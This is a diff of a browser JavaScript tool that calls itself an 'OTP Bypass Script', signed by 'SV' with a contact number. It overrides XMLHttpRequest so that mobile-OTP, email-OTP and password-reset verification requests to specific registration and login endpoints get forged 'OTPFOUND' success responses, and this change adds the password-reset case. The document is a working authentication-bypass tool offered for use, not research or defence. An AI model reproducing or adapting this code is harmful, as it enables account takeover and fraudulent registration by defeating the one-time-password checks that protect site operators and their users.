@@ -1,12 +1,12 @@
 (function () {
-  const notify = (msg) => alert(msg);
+  const notify = (msg) => alert(msg); // Alert instead of console.log
 
   notify("🧪 OTP Bypass Script Initialized by SV");
 
   const endpoints = [
     "/applicant-server/o/mql",
     "/server/o/mql",
-    "/login-server/o/mql", // for password reset
+    "/login-server/o/mql", // Added for password reset
   ];
 
   const fakeResponses = {
@@ -14,9 +14,12 @@
       ValidateMobileOTPForRegistration: {
         result: { OTPMobile: "OTPFOUND" },
         error: null,
-        responseHeader: null,
+        reponseHeader: null,
         errorCode: 0,
-        debugInfo: {},
+        debugInfo: {
+          stackTrace: null,
+          performanceInfo: null,
+        },
         isCompressed: false,
         serverTime: new Date().toISOString(),
       },
@@ -26,9 +29,12 @@
       ValidateEmailOTPForRegistration: {
         result: { emailOTP: "OTPFOUND" },
         error: null,
-        responseHeader: null,
+        reponseHeader: null,
         errorCode: 1000,
-        debugInfo: {},
+        debugInfo: {
+          stackTrace: null,
+          performanceInfo: null,
+        },
         isCompressed: false,
         serverTime: new Date().toISOString(),
       },
@@ -38,21 +44,28 @@
       dbPresentOTPValidate: {
         result: { user: "email@example.com" },
         error: null,
-        responseHeader: null,
+        reponseHeader: null,
         errorCode: 0,
-        debugInfo: {},
+        debugInfo: {
+          stackTrace: null,
+          performanceInfo: null,
+        },
         isCompressed: false,
         serverTime: new Date().toISOString(),
       },
     }),
 
+    // 🔐 New: OTP Verification for Password Reset
     OtpVerificationForChangingPassword: () => ({
       OtpVerificationForChangingPassword: {
         result: { resetOTP: "OTPFOUND" },
         error: null,
-        responseHeader: null,
+        reponseHeader: null,
         errorCode: 1000,
-        debugInfo: {},
+        debugInfo: {
+          stackTrace: null,
+          performanceInfo: null,
+        },
         isCompressed: false,
         serverTime: new Date().toISOString(),
       },
@@ -63,47 +76,40 @@
   const originalSend = XMLHttpRequest.prototype.send;
 
   XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
-    this._interceptUrl = url;
+    this._url = url;
     return originalOpen.apply(this, arguments);
   };
 
   XMLHttpRequest.prototype.send = function (body) {
     try {
-      if (typeof body === "string" && endpoints.some(ep => this._interceptUrl.includes(ep))) {
-        const matchedKey = Object.keys(fakeResponses).find(key => body.includes(key));
+      if (typeof body === "string" && endpoints.some(ep => this._url.includes(ep))) {
+        const matchedKey = Object.keys(fakeResponses).find((key) =>
+          body.includes(key)
+        );
 
         if (matchedKey) {
           const xhr = this;
-          const fakeResponse = fakeResponses[matchedKey]();
-          const fakeResponseText = JSON.stringify(fakeResponse);
+          const fakeResponseText = JSON.stringify(fakeResponses[matchedKey]());
 
-          notify(`✅ OTP Verified Successfully.\nThank you for using the tool.\nSV | Contact: 9921076909`);
+          // ✅ Alert on successful OTP interception
+          notify(`✅ OTP Verified Successfully.\nThank you for using our tool.\nSV | Contact: 9921076909`);
 
-          // Override response properties
-          Object.defineProperty(xhr, 'responseText', {
-            get: () => fakeResponseText
-          });
-
-          Object.defineProperty(xhr, 'response', {
-            get: () => fakeResponseText
-          });
-
-          Object.defineProperty(xhr, 'status', {
-            get: () => 200
-          });
-
-          Object.defineProperty(xhr, 'readyState', {
-            get: () => 4
-          });
-
-          // Simulate async readyState change
-          setTimeout(() => {
-            if (typeof xhr.onreadystatechange === 'function') {
-              xhr.onreadystatechange();
+          // Patch onreadystatechange to inject fake response
+          const originalOnReadyStateChange = xhr.onreadystatechange;
+          xhr.onreadystatechange = function () {
+            if (xhr.readyState === 4) {
+              try {
+                Object.defineProperty(xhr, "responseText", {
+                  get: () => fakeResponseText,
+                });
+              } catch (e) {
+                xhr.responseText = fakeResponseText;
+              }
             }
-          }, 0);
-
-          return; // Prevent actual request from sending
+            if (originalOnReadyStateChange) {
+              return originalOnReadyStateChange.apply(this, arguments);
+            }
+          };
         }
       }
     } catch (err) {
